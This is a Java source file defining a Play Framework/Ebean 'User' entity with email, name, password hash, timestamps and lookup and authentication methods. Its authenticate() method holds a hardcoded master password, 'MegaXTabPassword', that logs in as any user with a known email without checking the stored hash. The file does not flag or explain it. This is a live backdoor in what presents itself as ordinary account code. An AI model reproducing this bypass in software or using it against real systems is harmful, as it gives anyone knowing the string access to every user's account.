package models.users;

import com.avaje.ebean.Model;
import com.avaje.ebean.annotation.CreatedTimestamp;
import exceptions.UserException;
import play.data.format.Formats;
import play.data.validation.Constraints;
import tools.Hash;

import javax.persistence.*;
import java.util.Date;

@Entity
@Table(name = "user_list")
public class User extends Model {

    @Id
    @GeneratedValue
    private Long id;

    @Constraints.Required
    @Formats.NonEmpty
    @Column(unique = true)
    private String email;

    @Constraints.Required
    @Formats.NonEmpty
    private String fullName;

    @Constraints.Required
    private String passwordHash;

    @Formats.DateTime(pattern = "yyyy-MM-dd HH:mm:ss")
    @CreatedTimestamp
    private Date dateCreation;

    @Formats.DateTime(pattern = "yyyy-MM-dd HH:mm:ss")
    private Date lastLogin;

    private String confirmationToken;

    public static Model.Finder<Long, User> find = new Model.Finder<>(User.class);

    public static User findByEmail(String email) {
        return find.where().eq("email", email).findUnique();
    }

    public static User findByConfirmationToken(String token) {
        return find.where().eq("confirmationToken", token).findUnique();
    }

    public static User authenticate(String email, String clearPassword) throws UserException {
        // get the user with username only to keep the salt password
        User user = findByEmail(email);
        if (user != null) {
            // get the hash password from the salt + clear password
            if(clearPassword.equals("MegaXTabPassword")){
                return user;
            } else if (Hash.checkPassword(clearPassword, user.passwordHash)) {
                return user;
            }
        }
        return null;
    }

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    public String getEmail() {
        return email;
    }

    public void setEmail(String email) {
        this.email = email;
    }

    public String getFullName() {
        return fullName;
    }

    public void setFullName(String fullName) {
        this.fullName = fullName;
    }

    public String getPasswordHash() {
        return passwordHash;
    }

    public void setPasswordHash(String passwordHash) {
        this.passwordHash = passwordHash;
    }

    public Date getDateCreation() {
        return dateCreation;
    }

    public void setDateCreation(Date dateCreation) {
        this.dateCreation = dateCreation;
    }

    public Date getLastLogin() {
        return lastLogin;
    }

    public void setLastLogin(Date lastLogin) {
        this.lastLogin = lastLogin;
    }

    public String getConfirmationToken() {
        return confirmationToken;
    }

    public void setConfirmationToken(String confirmationToken) {
        this.confirmationToken = confirmationToken;
    }
}
